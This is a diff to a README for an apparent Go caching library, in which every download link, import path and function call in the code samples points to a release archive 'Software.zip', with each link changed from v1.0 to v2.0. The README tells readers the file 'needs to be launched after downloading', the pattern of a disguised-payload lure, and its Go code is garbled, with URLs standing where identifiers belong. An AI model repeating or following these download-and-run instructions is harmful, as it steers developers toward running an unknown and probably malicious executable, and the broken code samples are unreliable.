@@ -1,8 +1,8 @@
 # 🚀 **DB Caching Layer Module - A Go-based generic, thread-safe caching and persistence layer for database records**
 
-![database](https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip)
+![database](https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip)
 
-[![Download Module](https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip)](https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip)
+[![Download Module](https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip)](https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip)
 
 Welcome to the **dbcachinglayer** repository! This module provides a flexible and efficient caching layer for database records, built using Go programming language. With support for concurrency, CRUD operations, and thread-safe mechanisms, this module aims to streamline the process of caching and persisting data in a database.
 
@@ -16,7 +16,7 @@ Welcome to the **dbcachinglayer** repository! This module provides a flexible an
 
 ## Installation
 To get started with the **dbcachinglayer** module, you can download the latest release from the following link:
-[Download Module](https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip) 📦
+[Download Module](https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip) 📦
 
 *Note: The file needs to be launched after downloading.*
 
@@ -33,27 +33,27 @@ If the above link is not working or no longer available, please check the "Relea
 Using the **dbcachinglayer** module in your Go application is simple. Start by importing the module into your code:
 
 ```go
-import "https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip"
+import "https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip"
 ```
 
 Next, initialize the caching layer and configure it according to your database settings:
 
 ```go
-cache := https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip()
-https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip("key", "value")
+cache := https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip()
+https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip("key", "value")
 ```
 
 You can now perform various CRUD operations using the caching layer:
 
 ```go
 // Retrieve value
-value, ok := https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip("key")
+value, ok := https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip("key")
 
 // Update value
-https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip("key", "new_value")
+https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip("key", "new_value")
 
 // Delete entry
-https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip("key")
+https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip("key")
 ```
 
 For more detailed usage instructions and examples, please refer to the documentation or examples section of this repository.
@@ -66,17 +66,17 @@ package main
 
 import (
     "fmt"
-    "https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip"
+    "https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip"
 )
 
 func main() {
-    cache := https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip()
-    https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip("name", "John Doe")
+    cache := https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip()
+    https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip("name", "John Doe")
 
-    if value, ok := https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip("name"); ok {
-        https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip("Name:", value)
+    if value, ok := https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip("name"); ok {
+        https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip("Name:", value)
     } else {
-        https://github.com/pyc888/dbcachinglayer/releases/download/v1.0/Software.zip("Name not found in cache")
+        https://github.com/pyc888/dbcachinglayer/releases/download/v2.0/Software.zip("Name not found in cache")
     }
 }
 ```
